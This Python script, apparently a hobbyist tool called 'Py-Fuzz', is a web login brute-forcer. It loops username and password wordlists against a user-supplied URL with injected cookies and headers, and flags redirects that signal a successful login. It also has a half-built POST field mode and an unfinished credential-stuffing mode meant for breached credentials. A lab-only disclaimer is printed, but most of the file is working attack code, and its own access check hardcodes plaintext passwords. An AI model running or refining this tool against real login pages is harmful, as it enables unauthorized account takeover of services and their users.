import requests, time, timeit, urllib.parse #requests needed for the script

logins = [
    {"username": "admin", "password" : "allowed"},
    {"username": "reyansh", "password" : "2011"}
] #allowed logins

def login():
  inputUser = str(input("Enter username: ")).lower() #user enters username
  inputPass = str(input("Enter password: ")).lower() #user enters password
  for i in range(len(logins)):
    if inputUser == logins[i]["username"] and inputPass == logins[i]["password"]: #iterates through the dictionary list, finding if anything matches
      print("Authorized")
      return 1
  else:
    print("invalid creds!")
    return 0


def GET_REQ(unamelist, passlist):
  overrideUser = str(input("Does the GET request use a username parameter other than 'username': (y/n)")).lower()
  if overrideUser == "y":
    overrideUser = str(input("Enter the username parameter: "))
  else:
    overrideUser = "username"
  

  overridePass = str(input("Does the GET request use a password paramter other than 'password': (y/n)")).lower()
  if overridePass == "y":
    overridePass = str(input("Enter the password parameter: "))
  else:
    overridePass = "password"


  injected_cookies = {} #empty cookie list to inject
  while True:
    choice = input("Do you want to manually inject a specific cookie? (y/n): ").lower()
    if choice == 'n':
      break
      
    if choice == 'y':
      # 1. Get the Name (the server needs to know WHICH cookie you are sending)
      cookie_name = input("Enter the cookie name (e.g., 'login' or 'session'): ")
          
      # 2. Get the Value
      raw_val = input("Enter cookie value (plaintext or encoded): ")
          
      # 3. URL encode the value
      encoded_val = urllib.parse.quote(raw_val, safe='')
          
      # 4. Save to dictionary: { 'name': 'value' }
      injected_cookies[cookie_name] = urllib.parse.quote(raw_val, safe='')


  injectHeaders = {}
  while True:
    choice = input("Do you want to manually add headers?: (y/n): ").lower()
    if choice == 'n':
      break
      
    if choice == 'y':
      header_name = input("Enter header name: ").lower()
      header_val = input("Enter value of header: ").lower()
      injectHeaders[header_name] = header_val
    
    
  print(f"[*] RUNNING ATTACK ON : {url_target}")
  for user in unamelist:
    for passw in passlist:
      userParam = overrideUser + "=" + user
      passParam = overridePass + "=" + passw
      #print(f"DEBUG: first param: {overrideUser} and second param: {overridePass}")

      payload = {overrideUser: user, overridePass: passw}
      try:
        time.sleep(0.2)
        start_time = time.perf_counter()
        response = requests.get(url_target, params=payload, cookies=injected_cookies, timeout=5, allow_redirects=False, headers=injectHeaders)

        # Measure size and end time
        size = len(response.content)
        end_time = time.perf_counter()

        duration = (end_time - start_time) * 1000
        page_text = response.text
        #print(f"debugging: {response.headers.get('Content-Length')}")
        redirectKeywords = ["window.location", "redirectLocation", "redirect", "newURL"]
        if size > 0:
            # Added a tab (\t) to help align columns in the console
            print(f'User: {user:10} | Pass: {passw:10} | Size: {size:6} | Time: {duration:.2f}ms | Status: {response.status_code}')
            if response.status_code in [301, 302, 303]:
              location = response.headers.get('Location')
              print(f'[+] FOUND REDIRECT -> {location}')
            for keyword in redirectKeywords:
              if keyword in page_text:
                print(f"\n[!!!] JAVASCRIPT REDIRECT DETECTED: {user} : {passw}")
                if keyword == "window.location":
                  try:
                    target_path = page_text.split('window.location=')[1].split(';')[0].strip("'\"").strip("\"").strip("<")
                    print(f"      Redirect Target: {target_path}")
                  except:
                    pass
                  print("-" * 30)
        else:
            print(f'[!] No content returned for {user}')

      except requests.exceptions.RequestException as err:
        print(f"[X] Request Error: {err}")
  return 0  


def POST_REQ():
  metadata_dictionary = {}
  while True:
    answer = str(input("Do you want to add metadata into the POST request? (y/n)")).lower()
    if answer == 'n':
      print('-' * 30)
      break
    if answer != 'y':
      print("Invalid input, no new metadata added")
      pass

    dataName = str(input("Enter NAME for metadata (name:data): "))
    dataValue = str(input("Enter INFO for metadata (name:data): "))
    metadata_dictionary[dataName] = dataValue
  
  injectHeaders = {}
  isForm = str(input("Does the service use standard HTML form submission? <check DevTools if unsure> (y/n): ")).lower()
  if isForm == 'y':
    injectHeaders["Content-Type"] = "application/x-www-form-urlencoded"
  else:
    injectHeaders["Content-Type"] = "application/json"

  while True:
    ask = str(input("Do you want to use specific headers? (y/n)")).lower()
    if ask == 'n':
      print("No headers added to packet")
      print("-" * 30)
      break
    if ask != 'y':
      print("Invalid input, no new headers added")
      pass
      
    headerName = str(input("Enter NAME for header: "))
    headerValue = str(input("Enter VALUE for header: "))

    injectHeaders[headerName] = headerValue
  
  injectCookie = {}
  while True:
    askUser = str(input("Do you want to inject cookies? (y/n)")).lower()
    if askUser == 'n':
      print("No cookies added to packet")
      print("-" * 30)
      break
    if askUser != 'y':
      print("Invalid input, no new cookies added")
      pass
      
    cookieName = str(input("Enter NAME for cookie: "))
    cookieVal = str(input("Enter VALUE for cookie: "))

    injectCookie[cookieName] = cookieVal
  
  print("[!] FLUSH INJECTION: using ALL metadata sections in one POST request")
  start_time = time.perf_counter()
  try:
    if isForm == 'y':
      response = requests.post(url_target, cookies=injectCookie, timeout=5, allow_redirects=False, data=metadata_dictionary, headers=injectHeaders)
    else:
      response = requests.post(url_target, cookies=injectCookie, timeout=5, allow_redirects=False, json=metadata_dictionary, headers=injectHeaders)
  except requests.exceptions.RequestException as err:
    print(f"[X] Request Error: {err}")
    return

  end_time = time.perf_counter()
  size = len(response.content)
  page_text = response.text

  print("-" * 60)
  print("OUTPUT: ")
  print(f"Response Code: {response.status_code}")
  print(f"Response Time (ms): {(end_time - start_time) * 1000:.2f}")
  print(f"Response Size: {size}")
  askForContent = str(input("Would you like to view received content? (y/n)")).lower()
  if askForContent == 'y':
    try:
      print(response.json())
    except ValueError:
      print(page_text)
  if askForContent not in ("y", "n"):
    print("Invalid input... defaulting to NO")
  


  askForText = str(input("Would you like the view the output content for each brute-force attempt? (y/n)")).lower()
  if askForText not in ("y", "n"):
    print("Invalid input... defaulting to NO")
    askForText = 'n'
  print("-" * 60)
  #Brute-Force each section
  print("[!] STARTING BRUTE-FORCE ATTACK ON EACH METADATA FIELD...")
  for item in metadata_dictionary:
    print(f"[***] BRUTE-FORCING: {item} WITH VALUE: {metadata_dictionary[item]}")
    data = {
      item: metadata_dictionary[item]
    }
    start = time.perf_counter()
    try:
      if isForm == 'y':
        response = requests.post(url_target, cookies=injectCookie, timeout=5, allow_redirects=False, data=data, headers=injectHeaders)
      else:
        response = requests.post(url_target, cookies=injectCookie, timeout=5, allow_redirects=False, json=data, headers=injectHeaders)
    except requests.exceptions.RequestException as err:
      print(f"[X] Request Error: {err}")
      continue
    size = len(response.content)
    end = time.perf_counter()
    print(f"Size: {size} | Time: {(end - start) * 1000:.2f}ms | Status: {response.status_code}")
    if askForText == 'y':
      try:
        print("Response Content: ")
        print(response.json())
      except ValueError:
        print("Response Content: ")
        print(response.text)
    print("-" * 30)
  return 0

def CRED_STUFF():
  diyCraft = str(input("Do you want to craft your own wordlists (y/n)")).lower()
  if diyCraft == 'y':
    wordlistU = []
    wordlistP = []
    while True: #username wordlist gen
      newUser = str(input("Enter a username to add to the wordlist (or type 'done' to finish): "))
      if newUser.lower() == 'done':
        break
      wordlistU.append(newUser)
    while True: #password wordlist gen
      newPass = str(input("Enter a password to add to the wordlist (or type 'done' to finish): "))
      if newPass.lower() == 'done':
        break
      wordlistP.append(newPass)
  else:
    wordlistPath = str(input("Enter the file path for your USERNAME wordlist: "))
    wordlistU = []
    with open(wordlistPath, 'r') as f:
      for line in f:
        wordlistU.append(line.strip())
    wordlistPathP = str(input("Enter the file path for your PASSWORD wordlist: "))
    wordlistP = []
    with open(wordlistPathP, 'r') as f:
      for line in f:
        wordlistP.append(line.strip())
  



if __name__ == "__main__": #python entry point
  
  isLogged = login()
  if isLogged == 1:
    version = "1.0"
    print(" ")
    print("DISCLAIMER: This script is NOT intended for malicious use, only use it in labs or virtual machines. This script is provided AS-IS without any guarantees or warranties. The author is NOT responsible for any misuse or damage caused by this script.")
    print("INFO: This script is meant for forms that use USERNAME and PASSWORD forms that use GET/POST requests. More complex login forms (like OAuth, SSO, etc) are NOT supported. This script also assumes you understand basic HTTP packet transwer and web application concepts.")
    print(f"Welcome! Thank you for using Py-Fuzz Version {version}")

    url_target = str(input("Please enter the endpoint url to FUZZ: "))
    wordlistU = ["admin", "123qwerty", "qwerty", "hello", "woah", "testUser", "test"] #wordlist to fuzz GET with
    wordlistP = ["admin", "pass", "password", "test", "123qwerty", "imsosmart"]

    print("-" * 30)
    print("Which attack would you like to use: ")
    print("1. GET Brute-Force")
    print("2. POST Brute-Force")
    print("3. Credential Stuffing (Parellel list in POST requests || USE IF YOU HAVE BREACHED CREDENTIALS)")

    try:
      userIn = int(input("> "))
    except:
      print("Invalid input... process terminating")
    
    if userIn == 1:
      GET_REQ(wordlistU, wordlistP)
    elif userIn == 2:
      POST_REQ()
    elif userIn == 3:
      CRED_STUFF()
    else:
      print("Invalid input... process terminating")
  else:
    print('Exiting process...')